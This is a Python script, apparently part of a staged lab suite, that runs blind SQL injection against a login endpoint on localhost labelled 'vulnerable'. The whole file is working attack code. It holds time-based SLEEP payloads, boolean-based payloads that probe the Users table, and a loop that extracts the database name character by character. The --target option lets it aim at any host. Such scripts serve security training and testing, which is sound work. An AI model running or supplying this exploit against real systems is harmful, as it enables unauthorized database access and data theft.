#!/usr/bin/env python3
"""Phase 4: Blind SQL Injection - Time & Boolean Based"""

import requests
import time
import argparse


class Phase4BlindInjection:
    def __init__(self, target="http://localhost:5001"):
        self.target = target

    def time_based(self, name, payload, expected_delay=2):
        try:
            data = {"username": payload, "password": "test"}
            start = time.time()
            response = requests.post(
                f"{self.target}/api/vulnerable/login", json=data, timeout=10)
            elapsed = time.time() - start

            if elapsed >= expected_delay:
                print(f"  ✅ {name} - Delay: {elapsed:.2f}s")
                return True
            else:
                print(f"  ❌ {name} - No delay: {elapsed:.2f}s")
                return False
        except Exception as e:
            print(f"  ❌ {name} - Error: {str(e)}")
            return False

    def boolean_based(self, name, true_payload, false_payload):
        try:
            data_true = {"username": true_payload, "password": "test"}
            data_false = {"username": false_payload, "password": "test"}

            r_true = requests.post(
                f"{self.target}/api/vulnerable/login", json=data_true, timeout=5)
            r_false = requests.post(
                f"{self.target}/api/vulnerable/login", json=data_false, timeout=5)

            if r_true.status_code == 200 and r_false.status_code != 200:
                print(f"  ✅ {name} - Boolean-based confirmed")
                return True
            else:
                print(f"  ❌ {name} - No difference")
                return False
        except Exception as e:
            print(f"  ❌ {name} - Error: {str(e)}")
            return False

    def extract_database_name(self):
        print("\n  Extracting database name character by character...")
        db_name = ""
        for pos in range(1, 15):
            found = False
            for ascii_code in range(97, 123):  # a-z
                payload = f"' AND ASCII(SUBSTRING(database(), {pos}, 1)) = {ascii_code} --"
                try:
                    data = {"username": payload, "password": "test"}
                    r = requests.post(
                        f"{self.target}/api/vulnerable/login", json=data, timeout=5)
                    if r.status_code == 200:
                        db_name += chr(ascii_code)
                        print(
                            f"    Position {pos}: {chr(ascii_code)} -> {db_name}")
                        found = True
                        break
                except:
                    continue
            if not found:
                break
        return db_name

    def run(self):
        print("\n" + "="*70)
        print("PHASE 4: BLIND SQL INJECTION")
        print("="*70)
        print(f"Target: {self.target}\n")

        print("Time-Based Injection Tests:")
        self.time_based("True Condition",
                        "admin' AND IF(1=1, SLEEP(2), 0) --", 2)
        self.time_based("False Condition",
                        "admin' AND IF(1=2, SLEEP(2), 0) --", 1)
        print()

        print("Boolean-Based Injection Tests:")
        self.boolean_based("Admin Exists", "admin' AND (SELECT COUNT(*) FROM Users)=1 --",
                           "admin' AND (SELECT COUNT(*) FROM Users)=0 --")
        print()

        print("Data Extraction via Blind Injection:")
        db_name = self.extract_database_name()
        if db_name:
            print(f"\n  ✅ Extracted database name: {db_name}")

        print("\n" + "="*70)
        print("✅ Phase 4 Complete")
        print("="*70)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5001")
    args = parser.parse_args()
    phase = Phase4BlindInjection(target=args.target)
    phase.run()
